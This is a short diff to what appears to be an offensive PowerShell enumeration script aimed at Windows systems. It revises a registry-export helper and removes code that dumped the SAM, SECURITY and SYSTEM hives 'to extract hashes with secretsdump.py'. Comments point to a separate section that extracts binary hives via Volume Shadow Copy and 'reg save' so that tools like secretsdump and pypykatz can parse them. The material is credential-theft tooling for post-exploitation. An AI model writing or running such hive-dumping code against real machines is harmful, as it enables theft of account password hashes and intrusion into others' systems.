@@ -64,12 +64,14 @@ function Safe-CopyDir {
 }
 
 function Safe-RegExport {
+    # NOTE: produces a UTF-16 text .reg file for re-import into the registry only.
+    # NOT a binary hive - cannot be parsed by secretsdump/pypykatz. Use reg save for that.
     param([string]$Key, [string]$OutFile)
     try {
         $null = New-Item -ItemType Directory -Path (Split-Path $OutFile) -Force -ErrorAction SilentlyContinue
         $result = reg export $Key $OutFile /y 2>&1
         if (Test-Path $OutFile) {
-            Write-OK "Registry exported: $Key"
+            Write-OK "Registry exported (text/import format): $Key"
         }
     } catch {
         Write-Warn "Could not export registry: $Key"
@@ -623,14 +625,7 @@ foreach ($gppBase in $gppPaths) {
     }
 }
 
-# Export full registry hives (admin only)
-if ($IsAdmin) {
-    Write-Info "Exporting registry hives (admin)..."
-    Safe-RegExport "HKLM\SAM"      "$regDir\hives\sam.reg"
-    Safe-RegExport "HKLM\SECURITY" "$regDir\hives\security.reg"
-    Safe-RegExport "HKLM\SYSTEM"   "$regDir\hives\system.reg"
-    Write-Hit "Registry hives exported  - extract hashes with secretsdump.py"
-}
+# Binary hive extraction is handled in Section 13 (VSS + reg save fallback)
 
 Write-OK "Registry enumeration complete"
 
